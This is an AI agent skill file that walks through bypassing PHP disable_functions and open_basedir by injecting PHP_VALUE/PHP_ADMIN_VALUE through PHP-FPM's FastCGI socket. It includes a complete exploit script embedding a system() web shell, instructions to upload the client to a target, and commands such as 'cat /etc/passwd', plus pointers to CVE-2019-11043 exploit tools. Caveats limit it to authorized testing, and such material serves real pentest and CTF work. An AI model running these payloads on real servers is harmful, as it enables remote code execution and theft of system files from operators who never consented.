---
name: php-fpm-fastcgi-bypass
description: How to bypass PHP disable_functions and open_basedir restrictions using PHP-FPM FastCGI protocol vulnerabilities. Use this skill whenever the user mentions PHP-FPM, FastCGI, disable_functions bypass, open_basedir bypass, PHP configuration injection, or needs to test PHP security configurations. Make sure to use this skill for any PHP security assessment involving FastCGI protocol exploitation, PHP_VALUE/PHP_ADMIN_VALUE injection, or CVE-2019-11043 testing.
---

# PHP-FPM FastCGI Bypass Techniques

This skill covers techniques for bypassing PHP security restrictions (`disable_functions`, `open_basedir`) through FastCGI protocol manipulation. **Use only for authorized security testing on systems you own or have explicit permission to test.**

## When to Use This Skill

- Testing PHP-FPM configurations for security vulnerabilities
- Bypassing `disable_functions` restrictions in CTFs or authorized pentests
- Understanding FastCGI protocol exploitation
- Testing `open_basedir` restrictions
- Investigating CVE-2019-11043 (PHP-FPM RCE)

## Core Concepts

### PHP-FPM Architecture

PHP-FPM (FastCGI Process Manager) operates through:
- **Master process**: Oversees worker processes
- **Worker processes**: Execute PHP scripts
- **Connection methods**: Network ports (default 9000) or Unix sockets (e.g., `/var/run/php/php7.0-fpm.sock`)

### FastCGI Protocol

FastCGI is an improved CGI technology that:
- Maintains persistent connections (unlike CGI's per-request spawning)
- Uses binary protocol with packet types (BEGIN_REQUEST, PARAMS, STDIN, STDOUT, etc.)
- Allows parameter injection via `PHP_VALUE` and `PHP_ADMIN_VALUE`

## Bypass Techniques

### Technique 1: PHP_VALUE Injection

Inject PHP configuration via FastCGI parameters to bypass restrictions:

```php
$php_value = "disable_functions = \nallow_url_include = On\nauto_prepend_file = php://input";
```

**Key parameters:**
- `disable_functions = ` (empty to clear restrictions)
- `allow_url_include = On` (enable remote file inclusion)
- `auto_prepend_file = php://input` (prepend POST data as PHP code)
- `open_basedir = /` (remove path restrictions)

### Technique 2: PHP_ADMIN_VALUE Injection

Use `PHP_ADMIN_VALUE` to load malicious extensions:

```php
$php_admin_value = "extension_dir = /tmp\nextension = malicious.so";
```

**Note:** Requires recompiling the extension for the target PHP version.

### Technique 3: Gopherus Payload Generation

Generate FastCGI payloads using [Gopherus](https://github.com/tarunkant/Gopherus):

1. Generate payload targeting FastCGI listener
2. URL-encode and base64-encode the result
3. Send via PHP script using `fsockopen()` to Unix socket

## Implementation

### FastCGI Client Class

Use the bundled `fastcgi_client.php` script for programmatic FastCGI exploitation:

```bash
# Run the client
php scripts/fastcgi_client.php --socket /var/run/php-fpm.sock --cmd "whoami" --filepath /var/www/html/index.php
```

### Manual Exploit Script

Create a PHP file with the following structure:

```php
<?php
// FastCGI bypass exploit
if (!isset($_REQUEST['cmd'])) {
    die("Usage: ?cmd=whoami&filepath=/path/to/file.php\n");
}

$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php system(\$_REQUEST['command']); ?>";

$php_value = "disable_functions = \nallow_url_include = On\nauto_prepend_file = php://input";

$params = [
    'GATEWAY_INTERFACE' => 'FastCGI/1.0',
    'REQUEST_METHOD' => 'POST',
    'SCRIPT_FILENAME' => $_REQUEST['filepath'],
    'SCRIPT_NAME' => '/' . basename($_REQUEST['filepath']),
    'QUERY_STRING' => 'command=' . $_REQUEST['cmd'],
    'REQUEST_URI' => '/' . basename($_REQUEST['filepath']) . '?command=' . $_REQUEST['cmd'],
    'DOCUMENT_URI' => '/' . basename($_REQUEST['filepath']),
    'PHP_VALUE' => $php_value,
    'SERVER_SOFTWARE' => 'exploit',
    'REMOTE_ADDR' => '127.0.0.1',
    'SERVER_ADDR' => '127.0.0.1',
    'SERVER_PORT' => '80',
    'SERVER_NAME' => 'localhost',
    'SERVER_PROTOCOL' => 'HTTP/1.1',
    'CONTENT_LENGTH' => strlen($code)
];

echo $client->request($params, $code);
?>
```

## Testing Workflow

### Step 1: Reconnaissance

1. **Identify PHP-FPM socket location:**
   ```bash
   ls -la /var/run/php/
   grep -r "listen" /etc/php/*/fpm/pool.d/
   ```

2. **Check PHP version:**
   ```bash
   php -v
   phpinfo() | grep "PHP Version"
   ```

3. **Verify socket accessibility:**
   ```bash
   ls -la /var/run/php/php*-fpm.sock
   ```

### Step 2: Test Basic Exploitation

1. Upload the FastCGI client script to the web server
2. Test with a simple command:
   ```
   ?cmd=whoami&filepath=/var/www/html/index.php
   ```
3. Check if `phpinfo()` shows empty `disable_functions`

### Step 3: Escalate if Needed

If `PHP_VALUE` doesn't work:
- Try `PHP_ADMIN_VALUE` with extension loading
- Test CVE-2019-11043 with [phuip-fpizdam](https://github.com/neex/phuip-fpizdam)
- Use [FuckFastCGI](https://github.com/w181496/FuckFastcgi) for advanced bypasses

## Known Limitations

### PHP_VALUE Limitations

- `disable_functions` may not be fully bypassable via `PHP_VALUE` in modern PHP versions
- Some functions remain disabled even when `phpinfo()` shows empty `disable_functions`
- Server configuration may override FastCGI parameters

### Extension Loading Issues

- Extensions loaded via `PHP_ADMIN_VALUE` may cause process crashes
- Requires matching PHP version for compiled extensions
- May not work on all PHP-FPM configurations

## CVE-2019-11043

**Vulnerability:** PHP-FPM Remote Code Execution

**Exploitation:**
- Use [phuip-fpizdam](https://github.com/neex/phuip-fpizdam)
- Test environment: [vulhub/CVE-2019-11043](https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043)
- Analysis: [KnownSec404 Team](https://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc)

## Safety Warnings

> [!CAUTION]
> **Legal Notice:** Only use these techniques on systems you own or have explicit written permission to test. Unauthorized access is illegal.

> [!WARNING]
> **Modern PHP versions:** Many of these techniques may not work on PHP 7.4+ or PHP 8.x due to security improvements. Always verify before relying on a technique.

> [!NOTE]
> **Process stability:** Some exploitation methods may crash PHP-FPM workers, potentially causing service disruption.

## References

- [Gopherus](https://github.com/tarunkant/Gopherus) - FastCGI payload generator
- [FuckFastCGI](https://github.com/w181496/FuckFastcgi) - Advanced bypass tool
- [phuip-fpizdam](https://github.com/neex/phuip-fpizdam) - CVE-2019-11043 exploit
- [Balsn CTF Writeup](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy) - Original PHP exploit
- [FastCGI Protocol Specification](https://www.fastcgi.com/devkit/doc/fcgi-spec.html)

## Quick Start

```bash
# 1. Copy the fastcgi_client.php to your target
# 2. Test basic functionality
php scripts/fastcgi_client.php --socket /var/run/php-fpm.sock --cmd "id" --filepath /var/www/html/test.php

# 3. If successful, escalate privileges
php scripts/fastcgi_client.php --socket /var/run/php-fpm.sock --cmd "cat /etc/passwd" --filepath /var/www/html/test.php
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Connection refused | Verify socket path and permissions |
| Empty output | Check PHP-FPM logs for errors |
| Functions still disabled | Try PHP_ADMIN_VALUE or extension loading |
| Process crashes | Reduce payload complexity, check PHP version |
| Permission denied | Ensure web user can access socket |

## Next Steps

After successful exploitation:
1. Document findings for the security report
2. Recommend proper PHP-FPM hardening
3. Suggest removing dangerous functions from `disable_functions`
4. Recommend socket permission restrictions
5. Advise on PHP version updates if vulnerable
